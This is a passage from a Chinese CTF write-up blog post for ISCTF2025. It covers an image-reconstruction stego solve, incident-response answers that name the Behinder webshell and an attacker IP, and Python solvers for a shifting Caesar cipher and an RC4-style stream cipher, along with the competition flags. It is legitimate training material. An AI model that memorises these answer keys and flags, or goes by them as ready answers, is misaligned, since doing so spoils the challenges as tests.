<pre class="language-none"><code class="language-none">import numpy as np
from PIL import Image

# 读取文件内容
with open(&#39;米哈游_rbg_tb.py&#39;, &#39;r&#39;) as f:
    lines &#x3D; f.readlines()

data_rbg &#x3D; []
for line in lines:
    line &#x3D; line.strip()
    if line.startswith(&#39;(&#39;) and line.endswith(&#39;)&#39;):
        try:
            parts &#x3D; line[1:-1].split(&#39;,&#39;)
            # 解析 (R, B, G) 并转换为 (R, G, B)
            r &#x3D; int(parts[0])
            b &#x3D; int(parts[1]) 
            g &#x3D; int(parts[2]) 
            data_rbg.append((r, g, b))
        except:
            pass

data_rbg &#x3D; np.array(data_rbg, dtype&#x3D;np.uint8)

try:
    img2 &#x3D; Image.fromarray(data_rbg.reshape((399, 482, 3)), &#39;RGB&#39;)
    img2.save(&#39;image_corrected_399x482.png&#39;)
    print(&quot;图像已生成&quot;)
except Exception as e:
    print(f&quot;Error: &#123;e&#125;&quot;)</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251207095216.png" alt="image.png" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251207095221.png" alt="image.png" loading="lazy"></p>
<p>眼盯QKEMK_al4t_k4nT_au_Mm3_U0Kv_yzV_94e3_kg_yp3_O0teI<br>密钥是ISCTF<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251207101256.png" alt="image.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">ISCTF&#123;st4r_r4iL_is_Th3_M0St_fuN_94m3_in_th3_W0rlD&#125;</code></pre>

<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="奇怪的shell文件"><a href="#奇怪的shell文件" class="headerlink" title="奇怪的shell文件"></a>奇怪的shell文件</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204130429.png" alt="image.png" loading="lazy"></p>
<p>一眼冰蝎</p>
<pre class="language-none"><code class="language-none">ISCTF&#123;Behinder&#125;</code></pre>

<h3 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h3><p>直接搜register.php</p>
<pre class="language-none"><code class="language-none">192.168.37.177</code></pre>


<h2 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a>SIGNIN</h2><h3 id="Ez-Caesar"><a href="#Ez-Caesar" class="headerlink" title="Ez_Caesar"></a>Ez_Caesar</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">variant_caesar_decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    decrypted <span class="token operator">=</span> <span class="token string">""</span>
    shift <span class="token operator">=</span> <span class="token number">2</span>  
    
    <span class="token keyword">for</span> char <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>
        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> char<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>
                new_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> base <span class="token operator">-</span> shift<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> base<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                base <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
                new_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> base <span class="token operator">-</span> shift<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> base<span class="token punctuation">)</span>
            
            decrypted <span class="token operator">+=</span> new_char
            shift <span class="token operator">+=</span> <span class="token number">3</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            decrypted <span class="token operator">+=</span> char
            
    <span class="token keyword">return</span> decrypted
cipher <span class="token operator">=</span> <span class="token string">"KXKET&#123;Tubsdx_re_hg_zytc_hxq_vnjma&#125;"</span>
flag <span class="token operator">=</span> variant_caesar_decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>

<h3 id="小蓝鲨的RC4系统"><a href="#小蓝鲨的RC4系统" class="headerlink" title="小蓝鲨的RC4系统"></a>小蓝鲨的RC4系统</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token comment"># 1. 复制题目提供的类</span>
<span class="token keyword">class</span> <span class="token class-name">StreamCipher</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>i <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>j <span class="token operator">=</span> <span class="token number">0</span>
        
        j <span class="token operator">=</span> <span class="token number">0</span>
        key_bytes <span class="token operator">=</span> self<span class="token punctuation">.</span>_key_to_bytes<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> key_bytes<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
            self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    
    <span class="token keyword">def</span> <span class="token function">_key_to_bytes</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">_prga</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>i <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        self<span class="token punctuation">.</span>j <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>j <span class="token operator">+</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>i<span class="token punctuation">]</span>
        K <span class="token operator">=</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>S<span class="token punctuation">[</span>self<span class="token punctuation">.</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> K
    
    <span class="token keyword">def</span> <span class="token function">crypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        
        result <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            key_byte <span class="token operator">=</span> self<span class="token punctuation">.</span>_prga<span class="token punctuation">(</span><span class="token punctuation">)</span>
            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>byte <span class="token operator">^</span> key_byte<span class="token punctuation">)</span>
        
        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token comment"># 2. 准备参数</span>
key <span class="token operator">=</span> <span class="token string">"ISCTF2025"</span>  <span class="token comment"># 从注释中提取的 Key</span>
cipher_hex <span class="token operator">=</span> <span class="token string">"ba19a7116763ba8ba1c236c6bdc30187dcc8afb28c8fa5f266763880b74f5fff915613718f4d19c3baf4bbe24bd57303ce103d"</span>

<span class="token comment"># 3. 将 Hex 转换为 Bytes</span>
cipher_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>cipher_hex<span class="token punctuation">)</span>

<span class="token comment"># 4. 初始化密码机并解密</span>
cipher_machine <span class="token operator">=</span> StreamCipher<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
plaintext_bytes <span class="token operator">=</span> cipher_machine<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>cipher_bytes<span class="token punctuation">)</span>

<span class="token comment"># 5. 输出结果</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>plaintext_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>

</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/23ac0af4/" title="ISCTF2025-Writeup">http://ta0.fun/posts/23ac0af4/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/fa26c9c2/" rel="prev" title="DASCTF2025下半年赛-Writeup"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">DASCTF2025下半年赛-Writeup</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/17991232/" rel="next" title="HeroCTF2025"><span class="post-nav-text">HeroCTF2025</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>